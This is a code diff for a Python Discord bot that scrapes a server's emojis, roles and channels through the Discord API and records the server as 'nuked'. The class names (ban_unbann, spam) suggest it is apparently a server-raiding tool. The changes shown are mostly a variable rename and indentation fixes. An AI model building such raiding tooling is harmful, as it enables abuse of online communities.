@@ -6,7 +6,6 @@ from discord.ext import commands
 import random
 import time
 import configparser
-import collections
 import os
 from discord import Embed
 import json
@@ -122,9 +121,9 @@ class scrape:
                 return "Error getting role list:", response.status, response.reason
   
  async def save_server(token: str, server_id: str):
-    config = configparser.ConfigParser()  
-    config.read('server_info.ini')
-    if str(server_id) in config['servers']:
+    save = configparser.ConfigParser()  
+    save.read('server_info.ini')
+    if str(server_id) in save['servers']:
       return
     async with aiohttp.ClientSession() as session:
         async with session.get(f'https://discord.com/api/v6/guilds/{server_id}', headers={'Authorization': f'Bot {token}'}) as resp:
@@ -135,11 +134,10 @@ class scrape:
           channels_info = await response.json()
           
 
-        config = configparser.ConfigParser()
-        config[f'server_{server_id}'] = {'server_id': server_id}
-        config[f'emojis_{server_id}'] = {}
+        save[f'server_{server_id}'] = {'server_id': server_id}
+        save[f'emojis_{server_id}'] = {}
         for i, emoji in enumerate(server_info['emojis']):
-            config[f'emojis_{server_id}'][f'emoji_{i}'] = {
+            save[f'emojis_{server_id}'][f'emoji_{i}'] = {
                 'id': emoji['id'],
                 'name': emoji['name'],
                 'roles': emoji['roles'],
@@ -148,7 +146,7 @@ class scrape:
                 'managed': emoji['managed'],
                 'animated': emoji['animated'],
             }
-        config[f'roles_{server_id}'] = {}
+        save[f'roles_{server_id}'] = {}
         for i, role in enumerate(server_info['roles']):
             role_dict = {
                 'id': str(role['id']),
@@ -158,8 +156,8 @@ class scrape:
                 'mentionable': str(role['mentionable']),
             }
             role_json = json.dumps(role_dict)
-            config[f'roles_{server_id}'][f'role_{i}'] = role_json
-        config[f'channels_{server_id}'] = {}
+            save[f'roles_{server_id}'][f'role_{i}'] = role_json
+        save[f'channels_{server_id}'] = {}
         for i, channel in enumerate(channels_info):
             channel_dict = {
                 'id': str(channel['id']),
@@ -167,9 +165,10 @@ class scrape:
                 'type': str(channel['type']),
         }
             channel_json = json.dumps(channel_dict)
-            config[f'channels_{server_id}'][f'channel_{i}'] = channel_json      
-        with open('server_info.ini', 'a') as configfile:
-             config.write(configfile)
+            save[f'channels_{server_id}'][f'channel_{i}'] = channel_json    
+            save['servers'][str(server_id)] = "nuked"
+        with open('server_info.ini', 'w') as configfile:
+             save.write(configfile)
                               
 class ban_unbann:
  async def ban_member(serv, id, bottoken):
@@ -274,8 +273,8 @@ class spam:
             
 class database:
     async def add(guild, user):
-        id = str(user)
-        if id in config['users']:
+       id = str(user)
+       if id in config['users']:
          if str(guild.id) in config[f"server{id}"]:
             return
          else:
@@ -290,7 +289,7 @@ class database:
             with open('database.ini', 'w') as configfile:
              config.write(configfile)
             return True
-        else:
+       else:
             config['users'][id] = None
             config[id] = {}
             config[f"server{id}"] = {}
